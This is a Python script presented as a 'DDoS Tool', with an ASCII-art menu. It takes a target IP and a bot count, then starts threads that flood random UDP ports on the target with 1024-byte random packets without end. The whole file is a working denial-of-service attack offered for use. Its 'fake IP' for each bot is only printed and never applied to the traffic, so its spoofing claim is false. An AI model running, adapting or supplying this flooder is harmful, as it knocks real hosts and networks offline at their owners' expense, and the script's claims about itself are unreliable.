import os
import threading
import socket
import random
import time

attack_counts = {}
target_ip = ""
num_bots = 0
running = True  
current_banner = ""  

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def attack(target_ip, bot_id, attack_type, fake_ip):
    while True:
        try:
            if attack_type == "VOLUMETRIC":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(1024)  
                random_port = random.randint(1, 65535)  
                s.sendto(packet, (target_ip, random_port))
                print(f"Volumetric attack sent by bot {bot_id} to {target_ip} on random port {random_port} with IP {fake_ip}")
                time.sleep(0.1)  
            else:
                print("\033[91mOnly volumetric attacks are supported!\033[0m")
                return
        except Exception as e:
            print(f"Bot {bot_id} encountered an error: {e}")
            return


def select_banner():
    banners = [
        r'''
           ███████████████████████
         ██░                     ░██
      ████▒    ███████             ▒████
    ███▒▒░    ██░▒██████            ░▒▒███
 ████▒▒▒░     ██▒██████▒             ░▒▒▒████
    ███▒▒░    ████████▒▒            ░▒▒███
      ████▒    ███████▒            ▒████                
         ██░                      ░██
           ████████████████████████
        ''',
        r'''
           ███████████████████████
         ██░                     ░██
      ████▒           ███████      ▒████
    ███▒▒░           ██░▒██████     ░▒▒███
 ████▒▒▒░            ██▒██████▒      ░▒▒▒████
    ███▒▒░           ████████▒▒     ░▒▒███
      ████▒           ███████▒     ▒████                
         ██░                      ░██
           ████████████████████████
        ''',
        r'''
      ██████████████████████████████████
    ███▒▒░     █░▒████              ░▒▒███
 ████▒▒▒░     ██▒██████              ░▒▒▒████
    ███▒▒░     █████▒▒              ░▒▒███               
      ██████████████████████████████████
        '''
    ]
    return random.choice(banners)


def change_banner():
    global current_banner
    while running:
        current_banner = select_banner()  
        time.sleep(5)

def display_menu():
    clear_screen()  
    print("\033[91m" + current_banner + "\033[0m") 
    print("\033[91mDDoS Tool Menu:\033[0m")
    print("\033[91m1. Launch attack\033[0m")
    print("\033[91m3. Exit\033[0m")

def get_attack_params():
    clear_screen()
    global target_ip, attack_type
    target_ip = input("\033[91mEnter target IP: \033[0m")
    attack_type = input("\033[91mEnter attack type (VOLUMETRIC): \033[0m").upper()

def create_attacks():
    global target_ip, attack_type, num_bots
    threads = []
    for i in range(num_bots):
        fake_ip = generate_fake_ip()
        thread = threading.Thread(target=attack, args=(target_ip, i + 1, attack_type, fake_ip))
        thread.start()
        threads.append(thread)
    return threads

def main():
    global num_bots
    threads = []


    banner_thread = threading.Thread(target=change_banner)
    banner_thread.start()

    while True:
        display_menu()  
        choice = input("\033[91mEnter your choice: \033[0m")  

        if choice == "1":
            get_attack_params()
            num_bots = int(input("\033[91mEnter number of bots: \033[0m"))
            threads = create_attacks()
        elif choice == "3":  
            global running
            running = False  
            clear_screen()
            for thread in threads:
                thread.join()
            print("\033[91mExiting...\033[0m")
            break

if __name__ == "__main__":
    main()
